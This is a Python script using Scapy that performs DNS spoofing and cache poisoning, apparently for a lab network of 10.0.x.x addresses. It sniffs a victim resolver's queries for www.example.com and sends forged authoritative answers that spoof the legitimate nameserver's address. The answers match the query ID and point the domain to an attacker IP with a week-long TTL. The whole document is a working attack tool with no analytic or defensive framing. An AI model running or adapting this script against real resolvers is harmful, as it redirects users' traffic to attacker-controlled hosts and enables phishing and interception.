from scapy.all import *
import sys
import time


VICTIM_RESOLVER_IP = sys.argv[1] # Will be passed as argument: 10.0.5.1
ATTACKER_IP = "10.0.5.100"
ATTACKER_INTERFACE = "eth0"
TARGET_DOMAIN = "www.example.com." # Note the trailing dot for FQDN in DNS
LEGIT_AUTH_NS_IP = "10.0.2.1"

TTL = 604800 # one week


def spoof_dns_response(pkt):
    
    #Checks if the packet is a DNS query for TARGET_DOMAIN from the VICTIM_RESOLVER_IP, and if so, sends a forged response.
    
    if DNS in pkt and pkt[DNS].qr == 0 and pkt[IP].src == VICTIM_RESOLVER_IP and pkt[IP].dst == LEGIT_AUTH_NS_IP:

        if pkt[DNS].qd.qname.decode('utf-8') == TARGET_DOMAIN and pkt[DNS].qd.qtype == 1: # qtype 1 is 'A' record

            print(f"[*] Sniffed the EXACT query: ID=0x{pkt[DNS].id:04x}, "
                      f"Source={pkt[IP].src}, Destination={pkt[IP].dst}, "
                      f"Query={pkt[DNS].qd.qname.decode('utf-8')}")

            # Extract details from the original query
            original_query_id = pkt[DNS].id
            original_query_qname = pkt[DNS].qd.qname
            resolver_ephemeral_port = pkt[UDP].sport
            resolver_ip = pkt[IP].src


            # IP Layer: Source is the LEGITIMATE AUTHORITATIVE NS, Destination is the Resolver
            ip_layer = IP(dst=resolver_ip, src=LEGIT_AUTH_NS_IP)

            # UDP Layer: Source port is standard DNS (53), Destination port is Resolver's original query port
            udp_layer = UDP(dport=resolver_ephemeral_port, sport=53)

            # DNS Answer Section: The forged A record
            ans_section = DNSRR(rrname=original_query_qname,
                                type='A',
                                rdata=ATTACKER_IP, 
                                ttl=TTL) 

            # DNS Layer:
            # id: MUST MATCH the original query's ID
            # qr=1: This is a response
            # aa=1: Authoritative Answer
            # qdcount=1: One question section
            # ancount=1: One answer section
            # qd: Include the original question section
            # an: Include our forged answer section
            dns_layer = DNS(id=original_query_id,
                            aa=1, qr=1, qdcount=1, ancount=1,
                            qd=pkt[DNS].qd, 
                            an=ans_section)
            
            # Since the original query had an OPT pseudo-record, we include one in the response to be more convincing
            if DNSQR in pkt and pkt[DNSQR].qtype == 41: # qtype 41 is OPT
                opt_pseudo_rr = DNSRR(rrname='', type=41, rdata=b'', rdlen=0)
                dns_layer.arcount = 1
                dns_layer.ar = opt_pseudo_rr

            spoofed_packet = ip_layer / udp_layer / dns_layer

            send(spoofed_packet, verbose=1) # verbose=1 to see Scapy's output when sending
            print(f"[+] Sent forged response for ID 0x{original_query_id:04x} to {resolver_ip}. "
                  f"{TARGET_DOMAIN} -> {ATTACKER_IP}")


SNIFF_FILTER = f"udp and src host {VICTIM_RESOLVER_IP} and dst port 53"

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python3 {sys.argv[0]} <Victim_DNS_Resolver_IP>")
        print(f"Example: python3 {sys.argv[0]} 10.0.5.1")
        sys.exit(1)

    VICTIM_RESOLVER_IP = sys.argv[1]

    print(f"[*] Starting DNS Spoofing Listener on {ATTACKER_INTERFACE}...")
    print(f"[*] Waiting for queries from {VICTIM_RESOLVER_IP} for {TARGET_DOMAIN}...")
    print(f"[*] Forged IP will be: {ATTACKER_IP}")
    print(f"[*] Spoofed source will be: {LEGIT_AUTH_NS_IP}")

    try:
        sniff(iface=ATTACKER_INTERFACE, filter=SNIFF_FILTER, prn=spoof_dns_response, store=0)
    except Exception as e:
        print(f"[!] An error occurred during sniffing: {e}")
        print("    Ensure you have root privileges (sudo) and the correct interface name.")
        print(f"    Your interface is set to '{ATTACKER_INTERFACE}'. Check with 'ip a' or 'ifconfig'.")
    except KeyboardInterrupt:
        print("\n[*] Spoofing script interrupted by user.")